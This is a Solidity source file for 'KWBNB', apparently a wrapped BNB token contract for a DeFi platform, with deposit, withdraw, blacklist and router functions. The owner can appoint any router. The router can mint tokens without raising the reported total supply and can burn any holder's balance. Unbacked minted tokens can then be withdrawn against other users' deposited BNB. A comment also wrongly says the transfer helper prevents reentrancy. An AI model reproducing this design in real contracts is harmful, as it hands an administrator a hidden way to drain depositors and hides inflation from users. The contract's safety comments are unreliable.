// SPDX-License-Identifier: GPL-3.0-or-later
/*
    KWBNB (Kangaroo Wrapped BNB) Token Contract

    KWBNB is the wrapped BNB token for the KangarooDeFi platform.
    - KWBNB allows users to deposit native BNB and receive an equivalent amount of KWBNB tokens.
    - KWBNB can be used in KangarooDeFi's prediction markets and DeFi protocols.
    - Users can withdraw their BNB by burning KWBNB tokens.
    - The contract supports standard ERC20 operations, router-controlled mint/burn, and blacklist management.
    - For more details, see: https://kangaroodefi.gitbook.io/kangaroodefi-docs/kwbnb
    - Platform website: https://kangaroodefi.com
*/

pragma solidity ^0.8.1;

// Define the IERC20 interface
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    // Standard ERC20 events
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    // Custom events for deposits and withdrawals
    event Deposit(address indexed dst, uint wad);
    event Withdrawal(address indexed src, uint wad);
}

library TransferHelper {
    // Safe ETH transfer function to prevent reentrancy attacks
    function safeTransferETH(address to, uint value) internal {
        (bool success,) = to.call{value: value}(new bytes(0));
        require(success, 'TransferHelper: TRANSFER_FAILED');
    }
}

contract KWETH is IERC20 {
    string public name = "Wrapped Token";
    string public symbol = "Wtoken";
    uint8 public decimals = 18;
    uint256 private _totalSupply;
    address private owner;  // Owner of the contract, set at deployment
    address public Router;  // Address of the router allowed to mint/burn tokens    

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    // Blacklist functionality to restrict certain addresses
    mapping(address => bool) private _blacklist;

    // Events for tracking blacklist updates and burning operations
    event Blacklisted(address indexed account);
    event Unblacklisted(address indexed account);
    event Burn(address indexed from, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the contract owner");
        _;
    }

    modifier onlyRouter() {
        require(msg.sender == Router, "Not the contract Router");
        _;
    }

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        owner = msg.sender;  // Set deployer as owner
        name = _name;
        symbol = _symbol;
        decimals = _decimals;        
    }

    function SetRouter(address _router) external onlyOwner {
        Router = _router;
    }

    function deposit() public payable {
        _balances[msg.sender] += msg.value;
        _totalSupply += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint amount) public {
        require(_balances[msg.sender] >= amount, "Insufficient balance");
        require(address(this).balance >= amount, "Insufficient contract balance");

        _balances[msg.sender] -= amount;
        _totalSupply -= amount;
        TransferHelper.safeTransferETH(msg.sender, amount);  

        emit Withdrawal(msg.sender, amount);
    }

    // Function to allow the router to mint tokens without increasing total supply
    function MintByRouter(address _to, uint amount) external onlyRouter {
        _balances[_to] += amount;
    }

    // Function to allow the router to burn tokens from an account
    function BurnByRouter(address _account, uint amount) external onlyRouter {
        _balances[_account] -= amount;
    }

    // Blacklist an address to restrict token transfers
    function blacklist(address account) external onlyOwner {
        _blacklist[account] = true;
        emit Blacklisted(account);
    }

    // Remove an address from the blacklist
    function unblacklist(address account) external onlyOwner {
        _blacklist[account] = false;
        emit Unblacklisted(account);
    }

    // Check if an address is blacklisted
    function isBlacklisted(address account) public view returns (bool) {
        return _blacklist[account];
    }

    function ChangeOwner(address _newOwner) external onlyOwner {
        owner = _newOwner;
    }

    function ChangeConfig(string memory _name, string memory _symbol, uint8 _decimals) external onlyOwner {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;        
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(!isBlacklisted(msg.sender), "Sender is blacklisted");
        require(!isBlacklisted(recipient), "Recipient is blacklisted");
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) external view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        require(!isBlacklisted(msg.sender), "Sender is blacklisted");
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(!isBlacklisted(sender), "Sender is blacklisted");
        require(!isBlacklisted(recipient), "Recipient is blacklisted");

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, currentAllowance - amount);
        
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from zero address");
        require(recipient != address(0), "ERC20: transfer to zero address");
        require(_balances[sender] >= amount, "ERC20: insufficient balance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address _owner, address spender, uint256 amount) internal {
        require(_owner != address(0), "ERC20: approve from zero address");
        require(spender != address(0), "ERC20: approve to zero address");

        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function burn(uint256 amount) external {
        require(!isBlacklisted(msg.sender), "Sender is blacklisted");
        require(_balances[msg.sender] >= amount, "ERC20: insufficient balance");

        _balances[msg.sender] -= amount;
        _totalSupply -= amount;
        emit Burn(msg.sender, amount);
        emit Transfer(msg.sender, address(0x000000000000000000000000000000000000dEaD), amount);
    }
}
